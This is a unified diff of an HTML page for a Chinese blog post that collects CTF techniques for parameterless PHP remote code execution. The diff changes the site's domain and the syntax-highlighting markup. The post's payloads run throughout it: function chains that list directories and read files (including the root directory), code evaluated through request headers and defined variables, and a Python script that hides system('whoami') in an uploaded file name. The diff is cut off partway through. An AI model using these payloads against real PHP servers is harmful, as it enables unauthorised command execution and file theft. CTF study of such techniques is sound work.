@@ -9,18 +9,18 @@
 <meta property="og:description" content="本文首发于合天智汇：http://www.heetian.com/info/827
 之前做题时遇到了无参数RCE这类题，在网上查找资料发现都是零散的Writeup或者payload，没有一篇能够完整涵盖读取文件和命令执行的技巧，所以我花了点时间，将PHP无参数读文件以及命令执行所用到的方法总结了一遍，希望能对读者起到些许作用。" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://clq0.top/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" />
-<meta property="og:image" content="https://clq0.top/logo_.jpg"/>
+<meta property="og:url" content="https://blog.h4ck.fun/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" /><meta property="og:image" content="https://blog.h4ck.fun/logo_.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-07-07T15:00:03+08:00" />
 <meta property="article:modified_time" content="2020-07-07T15:00:03+08:00" />
+
 <meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://clq0.top/logo_.jpg"/>
+<meta name="twitter:image" content="https://blog.h4ck.fun/logo_.jpg"/>
 
 <meta name="twitter:title" content="PHP无参数读文件和RCE"/>
 <meta name="twitter:description" content="本文首发于合天智汇：http://www.heetian.com/info/827
 之前做题时遇到了无参数RCE这类题，在网上查找资料发现都是零散的Writeup或者payload，没有一篇能够完整涵盖读取文件和命令执行的技巧，所以我花了点时间，将PHP无参数读文件以及命令执行所用到的方法总结了一遍，希望能对读者起到些许作用。"/>
 <meta name="application-name" content="Leon&#39;s Blog">
-<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://clq0.top/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" /><link rel="prev" href="https://clq0.top/%E5%8F%88%E8%A7%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8phpuns-writeup/" /><link rel="next" href="https://clq0.top/htb-blunder-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.h4ck.fun/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce/" /><link rel="prev" href="https://blog.h4ck.fun/%E5%8F%88%E8%A7%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8phpuns-writeup/" /><link rel="next" href="https://blog.h4ck.fun/htb-blunder-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -28,11 +28,11 @@
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/clq0.top\/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce\/"
+            "@id": "https:\/\/blog.h4ck.fun\/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce\/"
         },"genre": "posts","keywords": "RCE","wordcount":  5056 ,
-        "url": "https:\/\/clq0.top\/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce\/","datePublished": "2020-07-07T15:00:03+08:00","dateModified": "2020-07-07T15:00:03+08:00","publisher": {
+        "url": "https:\/\/blog.h4ck.fun\/php%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6%E5%92%8Crce\/","datePublished": "2020-07-07T15:00:03+08:00","dateModified": "2020-07-07T15:00:03+08:00","publisher": {
             "@type": "Organization",
-            "name": "Leon","logo": "https:\/\/clq0.top\/logo_.jpg"},"author": {
+            "name": "Leon","logo": "https:\/\/blog.h4ck.fun\/logo_.jpg"},"author": {
                 "@type": "Person",
                 "name": "Leon"
             },"description": ""
@@ -148,7 +148,7 @@
 <p>例题：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -156,21 +156,21 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
 <span class="k">if</span><span class="p">(</span><span class="s1">&#39;;&#39;</span> <span class="o">===</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[^\W]+\((?R)?\)/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]))</span> <span class="p">{</span>    
     <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]);</span>
 <span class="p">}</span>
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
 </div>
 </div><h2 id="代码解析">代码解析</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[^\W]+\((?R)?\)/&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>这里使用<code>preg_replace</code>替换匹配到的字符为空，<code>\w</code>匹配字母、数字和下划线，等价于 <code>[^A-Za-z0-9_]</code>，然后<code>(?R)? </code>这个意思为递归整个匹配模式</p>
@@ -226,14 +226,14 @@
 </ol>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">chr(rand()) (不实际，看运气)
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">chr(rand()) (不实际，看运气)
 
 chr(time())
 
@@ -283,11 +283,11 @@ chr(current(localtime(time())))
 <p>ps：<code>ord()</code>返回字符串中第一个字符的Ascii值</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">print_r(scandir(chr(ord(hebrevc(crypt(time()))))));//（多刷新几次）
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">hebrevc</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">time</span><span class="p">()))))));</span><span class="c1">//（多刷新几次）
+</span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -300,10 +300,10 @@ chr(current(localtime(time())))
 <p>同理：<code>strrev(crypt(serialize(array())))</code>也可以得到<code>&quot;.&quot;</code>，只不过<code>crypt(serialize(array()))</code>的点出现在最后一个字符，需要使用<code>strrev()</code>逆序，然后使用<code>chr(ord())</code>获取第一个字符</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">())))))));</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img
@@ -363,10 +363,10 @@ chr(current(localtime(time())))
 <p><code>zflag.php</code>本来在最后一位，反过来就成为第一位，可以直接用<code>current(pos)</code>读取</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">show_source(current(array_reverse(scandir(getcwd()))));
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">show_source</span><span class="p">(</span><span class="nx">current</span><span class="p">(</span><span class="nx">array_reverse</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">()))));</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img
@@ -380,10 +380,10 @@ chr(current(localtime(time())))
 <p>如果是倒数第二个我们可以用：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">show_source(next(array_reverse(scandir(getcwd()))));
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">show_source</span><span class="p">(</span><span class="nx">next</span><span class="p">(</span><span class="nx">array_reverse</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">()))));</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>如果不是数组的最后一个或者倒数第二个呢？</p>
@@ -391,19 +391,19 @@ chr(current(localtime(time())))
 <p>所以我们可以用：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">show_source(array_rand(array_flip(scandir(getcwd()))));
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">show_source</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">()))));</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>或者：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">show_source(array_rand(array_flip(scandir(current(localeconv())))));
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">show_source</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">current</span><span class="p">(</span><span class="nx">localeconv</span><span class="p">())))));</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>（可以自己结合前面总结的构造<code>&quot;.&quot;</code>的方法切合实际过滤情况读取，后文就只列举简单的语句）</p>
@@ -443,11 +443,11 @@ chr(current(localtime(time())))
 </ol>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">())));</span> <span class="c1">//查看上一级目录的文件
+</span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -463,19 +463,19 @@ chr(current(localtime(time())))
 <p><code>print_r(next(scandir(getcwd())));</code>：我们<code>scandir(getcwd())</code>出现的数组第二个就是<code>&quot;..&quot;</code>，所以可以用<code>next()</code>获取</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">print_r(scandir(next(scandir(getcwd()))));//也可查看上级目录文件
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">next</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">()))));</span><span class="c1">//也可查看上级目录文件
+</span></code></pre></td></tr></table>
 </div>
 </div><p>结合上文的一些构造都是可以获得<code>&quot;..&quot;</code>的 ：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">next(scandir(chr(ord(hebrevc(crypt(time()))))))
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">next</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">hebrevc</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">time</span><span class="p">()))))))</span>
 </code></pre></td></tr></table>
 </div>
 </div><h3 id="读取上级目录文件">读取上级目录文件</h3>
@@ -483,10 +483,10 @@ chr(current(localtime(time())))
 <p>前面写到了<code>chdir()</code>，使用：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">show_source</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">())))))));</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>即可改变当前目录为上一层目录并读取文件：</p>
@@ -503,19 +503,19 @@ chr(current(localtime(time())))
 <p>这里<code>crypt()</code>和<code>time()</code>可以接收参数，于是构造：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));
-或更复杂的：
-show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));
-还可以用：
-show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">show_source</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">hebrevc</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">next</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">())))))))))));</span>
+<span class="nx">或更复杂的：</span>
+<span class="nx">show_source</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">hebrevc</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">next</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">hebrevc</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">phpversion</span><span class="p">())))))))))))))));</span>
+<span class="nx">还可以用：</span>
+<span class="nx">show_source</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">current</span><span class="p">(</span><span class="nx">localtime</span><span class="p">(</span><span class="nx">time</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">next</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">current</span><span class="p">(</span><span class="nx">localeconv</span><span class="p">()))))))))))));</span><span class="c1">//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
+</span></code></pre></td></tr></table>
 </div>
 </div><p>多刷新几次：</p>
 <p><img
@@ -529,10 +529,10 @@ show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(
 <p>还有一种构造方法<code>if()</code>：（这种更直观些，并且不需要找可接收参数的函数）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">if(chdir(next(scandir(getcwd()))))show_source(array_rand(array_flip(scandir(getcwd()))));
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">next</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">()))))</span><span class="nx">show_source</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">()))));</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img
@@ -547,10 +547,10 @@ show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(
 <h3 id="查看和读取根目录文件">查看和读取根目录文件</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">())))))));</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><code>strrev(crypt(serialize(array())))</code>所获得的字符串第一位有几率是<code>/</code>，所以使用以上payload可以查看根目录文件</p>
@@ -574,20 +574,20 @@ show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(
 <p>同样的：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">if(chdir(chr(ord(strrev(crypt(serialize(array())))))))print_r(scandir(getcwd()));
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">())))))))</span><span class="nx">print_r</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">()));</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>也可以查看根目录文件，但是也会受到权限限制，不一定成功</p>
 <p>读根目录文件：(也是需要权限)</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">if(chdir(chr(ord(strrev(crypt(serialize(array())))))))show_source(array_rand(array_flip(scandir(getcwd()))));
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span><span class="p">(</span><span class="nx">chdir</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nx">crypt</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">())))))))</span><span class="nx">show_source</span><span class="p">(</span><span class="nx">array_rand</span><span class="p">(</span><span class="nx">array_flip</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="nx">getcwd</span><span class="p">()))));</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>读文件暂时就写这么多，肯定还有许多函数可以达到相同效果，等待大佬的发掘吧</p>
@@ -606,7 +606,7 @@ show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(
 <p>经过查找，发现<code>getallheaders()</code>和<code>apache_request_headers()</code></p>
 <h3 id="getallheadersapache_request_headers">getallheaders()&amp;apache_request_headers()</h3>
 <p><code>getallheaders()</code>是<code>apache_request_headers()</code>的别名函数，但是该函数只能在<code>Apache</code>环境下使用</p>
-<p><img src="https://gitee.com/leonsec/images/raw/master/image-20200629104143966.png" alt="image-20200629104143966"  /></p>
+<img src="https://gitee.com/leonsec/images/raw/master/image-20200629104143966.png" alt="image-20200629104143966"  />
 <p>接下来利用方式就多了，任何<code>header</code>头部都可利用：</p>
 <p><img
         class="lazyload"
@@ -619,14 +619,14 @@ show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(
 <p>我们可以使用：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">?code=eval(pos(getallheaders()));
-//header
-Leon: phpinfo();
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">code</span><span class="o">=</span><span class="k">eval</span><span class="p">(</span><span class="nx">pos</span><span class="p">(</span><span class="nx">getallheaders</span><span class="p">()));</span>
+<span class="c1">//header
+</span><span class="c1"></span><span class="nx">Leon</span><span class="o">:</span> <span class="nx">phpinfo</span><span class="p">();</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img
@@ -697,10 +697,10 @@ Leon: phpinfo();
 <p>所以，利用get传递新变量可以造成命令执行，post、cookie同理，这里就不演示了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">?leon=phpinfo();<span class="ni">&amp;code=eval(pos(pos(get_defined_vars())));</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">leon</span><span class="o">=</span><span class="nx">phpinfo</span><span class="p">();</span><span class="o">&amp;</span><span class="nx">code</span><span class="o">=</span><span class="k">eval</span><span class="p">(</span><span class="nx">pos</span><span class="p">(</span><span class="nx">pos</span><span class="p">(</span><span class="nx">get_defined_vars</span><span class="p">())));</span>
 </code></pre></td></tr></table>
 </div>
 </div><p><img
@@ -714,7 +714,7 @@ Leon: phpinfo();
 <p>如何利用file变量进行rce呢？</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -726,16 +726,16 @@ Leon: phpinfo();
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
 
 <span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
   <span class="s2">&#34;system(&#39;whoami&#39;);&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span>
 <span class="p">}</span>
-<span class="c1">#data = {</span>
-<span class="c1">#&#34;code&#34;:&#34;eval(pos(pos(end(get_defined_vars()))));&#34;</span>
-<span class="c1">#}</span>
+<span class="c1">#data = {</span>
+<span class="c1">#&#34;code&#34;:&#34;eval(pos(pos(end(get_defined_vars()))));&#34;</span>
+<span class="c1">#}</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;http://127.0.0.1/333/222/111/index.php?code=eval(pos(pos(end(get_defined_vars()))));&#39;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="s2">&#34;ignore&#34;</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="s2">&#34;ignore&#34;</span><span class="p">))</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>这里要注意的是，file数组在最后一个，需要end定位，因为payload直接放在文件的名称上，再pos两次定位获得文件名</p>
@@ -770,7 +770,7 @@ Leon: phpinfo();
         title="image-20200629122228441" /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
